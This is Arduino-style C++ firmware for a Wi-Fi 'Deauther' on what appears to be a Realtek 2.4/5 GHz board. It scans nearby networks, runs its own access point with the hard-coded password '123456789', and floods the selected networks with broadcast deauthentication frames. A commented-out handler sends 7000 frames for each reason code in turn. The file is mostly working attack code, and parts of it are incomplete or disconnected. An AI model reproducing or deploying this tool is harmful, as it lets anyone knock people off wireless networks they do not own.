#include "vector"
#include "wifi_conf.h"
#include "map"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"
typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint channel;
} WiFiScanResult;



char *ssid = "Deauther_2-4_5GHZ";
char *pass = "123456789";



int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
WiFiServer server(80);
bool deauth_running = false;
uint8_t deauth_bssid[6];
uint16_t deauth_reason;
std::vector<int> current_targets; 
std::vector<int> deauth_targets;  
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) { 
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char*) record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}
int scanNetworks() {
  // DEBUG_SER_PRINT("Scanning WiFi networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(500);
    // DEBUG_SER_PRINT(" done!\n");
    return 0;
  } else {
    // DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}
// String parseRequest(String request) {
//   int path_start = request.indexOf(' ') + 1;
//   int path_end = request.indexOf(' ', path_start);
//   return request.substring(path_start, path_end);
// }
// std::map<String, String> parsePost(String &request) {
//     std::map<String, String> post_params;
//     int body_start = request.indexOf("\r\n\r\n");
//     if (body_start == -1) {
//         return post_params;
//     }
//     body_start += 4;
//     String post_data = request.substring(body_start);
//     int start = 0;
//     int end = post_data.indexOf('&', start);
//   while (end != -1) {
//         String key_value_pair = post_data.substring(start, end);
//         int delimiter_position = key_value_pair.indexOf('=');

//         if (delimiter_position != -1) {
//             String key = key_value_pair.substring(0, delimiter_position);
//             String value = key_value_pair.substring(delimiter_position + 1);
//             post_params[key] = value;
//         }
//         start = end + 1;
//         end = post_data.indexOf('&', start);
//     }
//     String key_value_pair = post_data.substring(start);
//     int delimiter_position = key_value_pair.indexOf('=');
//     if (delimiter_position != -1) {
//         String key = key_value_pair.substring(0, delimiter_position);
//         String value = key_value_pair.substring(delimiter_position + 1);
//         post_params[key] = value;
//     }
//     return post_params;

// }
// String makeResponse(int code, String content_type) {
//   String response = "HTTP/1.1 " + String(code) + " OK\n";
//   response += "Content-Type: " + content_type + "\n";
//   response += "Connection: close\n\n";
//   return response;
// }
// String makeRedirect(String url) {
//   String response = "HTTP/1.1 307 Temporary Redirect\n";
//   response += "Location: " + url;
//   return response;
// }

// void handle404(WiFiClient &client) {
//   client.write(makeRedirect("/").c_str());
// }
void startDeauth(int network_num) {
  digitalWrite(LED_R, LOW);
  current_channel = scan_results[network_num].channel;
  deauth_running = true;
  memcpy(deauth_bssid, scan_results[network_num].bssid, 6);
  // DEBUG_SER_PRINT("Starting Deauth-Attack on: " + scan_results[network_num].ssid + "\n");
  digitalWrite(LED_R, HIGH);
  digitalWrite(LED_B, HIGH);
}
void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);
  // DEBUG_SER_INIT();
  randomSeed(millis()); 
     IPAddress local_ip(192, 168, 4, 1); 
     IPAddress gateway(192, 168, 4, 1);  
     IPAddress subnet(255, 255, 255, 0); 
     WiFi.config(local_ip, gateway, subnet);


WiFi.apbegin(ssid, pass, (char *) String(current_channel).c_str()); //Không ẩn đoạn này thì hiện tên wifi


  if (scanNetworks() != 0) {
    while(true) delay(1000);
  }

}
// unsigned long deauth_start_time = 0; 
// std::vector<uint16_t> reason_codes = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24};

// int reason_index = 0; 

// void handleDeauth(WiFiClient &client, String &request) {
//     std::map<String, String> post_data = parsePost(request);
//     deauth_targets.clear();

//     if (post_data.find("net_num") != post_data.end()) {
//         String target_ids = post_data["net_num"];
//         int start = 0, end = 0;
//         while ((end = target_ids.indexOf(',', start)) != -1) {
//             int target_index = target_ids.substring(start, end).toInt();
//             if (target_index >= 0 && target_index < static_cast<int>(scan_results.size())) {
//                 deauth_targets.push_back(target_index);
//             }
//             start = end + 1;
//         }
//         int last_target = target_ids.substring(start).toInt();
//         if (last_target >= 0 && last_target < static_cast<int>(scan_results.size())) {
//             deauth_targets.push_back(last_target);
//         }
//     }

//     if (!deauth_targets.empty()) {
//         deauth_running = true;
//         deauth_start_time = millis();
//         // DEBUG_SER_PRINT("Deauth started at " + String(deauth_start_time / 1000) + " seconds.\n");

//         while (deauth_running) {  
//             for (int target : deauth_targets) {
//                 if (target >= 0 && target < static_cast<int>(scan_results.size())) {
//                     memcpy(deauth_bssid, scan_results[target].bssid, 6);

//                     // Gửi gói tin với từng mã lý do theo thứ tự
//                     for (int i = 0; i < 7000; i++) {
//                         wifi_tx_deauth_frame(deauth_bssid, (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", reason_codes[reason_index]);
//                     }

//             }
//             reason_index = (reason_index + 1) % reason_codes.size();
//         }
//         client.write(makeRedirect("/status").c_str());
//     } else {
//         // DEBUG_SER_PRINT("No valid targets for deauth.\n");
//         client.write(makeRedirect("/").c_str());
//     }
// }


void loop() {
  WiFiClient client = server.available();
  
   if (deauth_running) {
    for (int target : deauth_targets) {
        if (target >= 0 && target < static_cast<int>(scan_results.size())) {
            memcpy(deauth_bssid, scan_results[target].bssid, 6);
            wifi_tx_deauth_frame(deauth_bssid, (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
            // DEBUG_SER_PRINT("Deauth packet sent to: " + scan_results[target].ssid + "\n");
        }
    }

  }
}